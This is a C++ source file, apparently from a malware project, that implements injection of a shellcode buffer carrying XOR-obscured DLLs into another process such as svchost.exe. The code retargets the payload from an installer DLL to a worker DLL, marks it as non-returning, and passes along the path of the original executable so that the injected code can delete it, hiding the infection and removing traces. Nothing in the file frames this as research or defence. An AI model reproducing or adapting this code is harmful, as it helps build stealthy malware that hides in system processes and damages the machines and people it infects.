/*
	Install_Injection.cpp
	Injection method installation 
	NB: this module uses passed SHELLCODE_CONTEXT structure to prepare new binbuffer (or copy it)
	to another injecting process. Due to relative ptrs in context, it could be copied directly
	The only change should be done here is modification of execution target from IDD (install dll) to WDD (work dll)
	Alternativly, IDD may be wiped entierly
*/

#include <windows.h>

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\ProcessInjectMP.h"
#include "..\Shellcode\shellcode.h"
#include "..\shared\ModuleDescriptor.h"

#include "Install_Injection.h"



/*
	Attempts to perform injection of data passed by shellcode's context
	into another process, like svchost.exe
	pSContext points to start of buffer
	<shellcode_context><shellcode><idd xored><wdd xored><serialized binpack itself for later parsing>
*/
BOOL instInjection(SHELLCODE_CONTEXT *pSContext)
{
	BOOL bRes = FALSE;	// function result

	INJECT_CONTEXT ic = { 0 };	// params for AttemptSvchostInjection() call
	SHELLCODE_CONTEXT *sc_copy = NULL;	// ptr to a copy of original shellcode context structure, to modify ptrs to dll exec target

	DbgPrint("entered");

	// prepare a copy of full chunk started at pShellcodePtr
	ic.lInjectionChunkLen = pSContext->dwFullChunkLen;
	ic.pInjectionChunk = my_alloc(pSContext->dwFullChunkLen);

	if (!ic.pInjectionChunk) { DbgPrint("ERR: failed to alloc %u bytes to copy starter binpack", pSContext->dwFullChunkLen); return bRes; }

	// copy chunk
	memcpy(ic.pInjectionChunk, pSContext, ic.lInjectionChunkLen);

	// fill params for injection
	// NB: ic assumes offsets from the START of the chunk, not the shellcode itself, so modify ptrs correctly
	ic.lShellcodeEntryOffset = pSContext->dwShellcodeEntrypointOffset + pSContext->dwStructureLen;

	// get ptr to a shellcode context structure in a new buffer
	sc_copy = (SHELLCODE_CONTEXT *)(ic.pInjectionChunk);

	// change execution target in new shellcode context to point to WDD instead of IDD originally
	sc_copy->prelExecDll = sc_copy->prelWDD;
	sc_copy->dwExecDllLen = sc_copy->dwWDDLen;

	// also set no-return flag in new copy of structure
	sc_copy->bNoReturnFromShellcode = TRUE;

	// query host exe to be removed by WDD at injected process
	GetModuleFileNameW(NULL, (LPWSTR)&sc_copy->bRemoveFilePath[0], MAX_PATH);

	// call it
	bRes = AttemptSvchostInjection(&ic);
	DbgPrint("injection api returned %u", bRes);

	// do cleanup
	my_free(ic.pInjectionChunk);

	return bRes;
}